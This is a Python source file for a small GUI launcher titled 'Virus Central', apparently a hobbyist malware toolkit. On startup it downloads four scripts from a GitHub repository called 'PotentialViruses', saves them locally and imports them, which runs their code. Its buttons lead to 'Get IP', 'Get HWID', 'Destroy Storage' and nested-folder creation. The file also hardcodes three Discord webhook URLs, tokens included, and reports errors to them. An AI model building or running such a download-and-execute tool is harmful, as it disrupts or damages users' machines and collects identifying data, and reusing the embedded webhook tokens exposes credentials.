import customtkinter as tk
import requests
import os


Icon = "Icon"
if os.path.exists(Icon):
    print("'Icon' folder already exists")
else:
    print("Creating Icon folder")
    os.makedirs(Icon)
    print("'Icon' folder created")

filename = "Required_Files"
if os.path.exists(filename):
    print("'Required_Files' folder already exists")
else:
    print("Creating 'Required_Files' folder")
    os.makedirs(filename)
    print("'Required_Files' folder created")

DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1213562380676636813/TITZWG054q8LgmzM0mlGk0bL-WpnkuaoaTuVkh4xUEDZ34WAILNFwM-y93GXGH95SLWp"
FEEDBACK_DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1221533046746906705/UmI-FXnuaaGNppGfmYdA7fDeHMN2KUekp43K2vR1dGa6TJ7MDBVAJPpFmyd3QMMHLW9b"
ERROR_DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1221543200746111136/EJij3VCrHVxqwq-bSGwgSnWc8_oXNNP3tcFXcRHDzI62LHSZP5NviUDNv2txY63w-UnL"
# This will default to be sent to my webhooks, if anyone uses it for anything that is not this it will be deleted

def errorReporting(error):
    try:
        payload = {
            "content": f"**Error from a user:** (Multi Virus Tool)\n```{error}```"
        }
        requests.post(ERROR_DISCORD_WEBHOOK_URL, json=payload)
    
        # Log Discord webhook message
        print(f"Error sent to dev.")
        print()
    except Exception as e:
        print("Message failed to send, please report this. https://discord.gg/HAg9FT88sc (this link will never expire)")
        print(f"Error: {e}")
        input()

def download_ico(url, save_path):
    response = requests.get(url)
    if response.status_code == 200:
        if os.path.exists("Icon/Arhururan.ico"):
            print("Icon has already been downloaded")
        else:
            try:
                with open(save_path, 'wb') as f:
                    f.write(response.content)
                print("ICO file downloaded successfully!")
            except Exception as e:
                print(f"Failed to download ICO file.\nError: {e}")
                errorReporting(e)
                input()
    else:
        print("Failed to download ICO file.")
        input()

def download_py(url, save_path):
    response = requests.get(url)
    if response.status_code == 200:
        if os.path.exists(save_path):
            print("Python file has already been downloaded")
            
        else:
            try:
                with open(save_path, 'wb') as f:
                    f.write(response.content)
                print("Python file downloaded successfully!")
            except Exception as e:
                print(f"Failed to download Python file.\nError: {e}")
                errorReporting(e)
                input()
                
    else:
        print("Failed to download ICO file.")
        input()

# Download ICO file
ico_url = "https://raw.githubusercontent.com/Bernso/Icons/main/Arhururan.ico"
save_path = os.path.join(Icon, "Arhururan.ico")  # Full file path including directory
download_ico(ico_url, save_path)
print("ICO file download process completed.")

try:
    # Download python files
    url = "https://raw.githubusercontent.com/Bernso/PotentialViruses/main/getip.py"
    save_path = os.path.join(filename, "getip.py")  # Full file path including directory
    download_py(url, save_path)
    print("Python 1 file download process completed.")

    url = "https://raw.githubusercontent.com/Bernso/PotentialViruses/main/monkeytown.py"
    save_path = os.path.join(filename, "monkeytown.py")  # Full file path including directory
    download_py(url, save_path)
    print("Python 2 file download process completed.")

    url = "https://raw.githubusercontent.com/Bernso/PotentialViruses/main/gethwid.py"
    save_path = os.path.join(filename, "gethwid.py")  # Full file path including directory
    download_py(url, save_path)
    print("Python 3 file download process completed.")

    url = "https://raw.githubusercontent.com/Bernso/PotentialViruses/main/beanCreatornoUI.py"
    save_path = os.path.join(filename, "beanCreatornoUI.py")  # Full file path including directory
    download_py(url, save_path)
    print("Python 4 file download process completed.")

    print("All python files downloaded successfully!")

except Exception as e:
    print(f"Failed to download python files.\nError: {e}")
    errorReporting(e)
    input()

def exitv2():
    os.system('cls')
    print("Closing... ")
    print("Thanks for using my product!")
    quit()


app = tk.CTk()
app.geometry("360x250")
app.title("Virus Central (By Bernso)")
app.iconbitmap("Icon/Arhururan.ico")

def calculate_button_width(texts):
    max_length = max(len(text) for text in texts)
    return max_length + 4  # Add some padding

# Calculate the required width for each button
button_texts = ["Get IP", "Get HWID", "Destroy Storage", "Create Folders within Folders"]
button_width = calculate_button_width(button_texts) * 4.9
button_height = 70

from Required_Files.getip import get_public_ip
from Required_Files.gethwid import get_hwid
import Required_Files.beanCreatornoUI 
import Required_Files.monkeytown

#ipWidth = calculate_button_width('Get IP')
ipButton = tk.CTkButton(app, text="Get IP", command=get_public_ip, width=button_width, height=button_height)
ipButton.grid(row=0, column=0, padx=10, pady=10, sticky='nswe')

hwidButton = tk.CTkButton(app, text="Get HWID", command=get_hwid, width=button_width, height=button_height)
hwidButton.grid(row=0, column=1, padx=10, pady=10, sticky='nswe')

destoryStorageButton = tk.CTkButton(app, text="Destroy Storage", command=Required_Files.beanCreatornoUI.startup, width=button_width, height=button_height)
destoryStorageButton.grid(row=1, column=0, padx=10, pady=10, sticky='nswe')

createFoldersWithinFoldersButton = tk.CTkButton(app, text="Create Folders\nwithing Folders", command=Required_Files.monkeytown.main, width=button_width, height=button_height)
createFoldersWithinFoldersButton.grid(row=1, column=1, padx=10, pady=10, sticky='nswe')

exitButton = tk.CTkButton(app, text="Exit", command=exitv2, width=60, height=30)#.grid(row=2, column=1, padx=10, pady=10)
exitButton.place(x=150, y=200)

app.mainloop()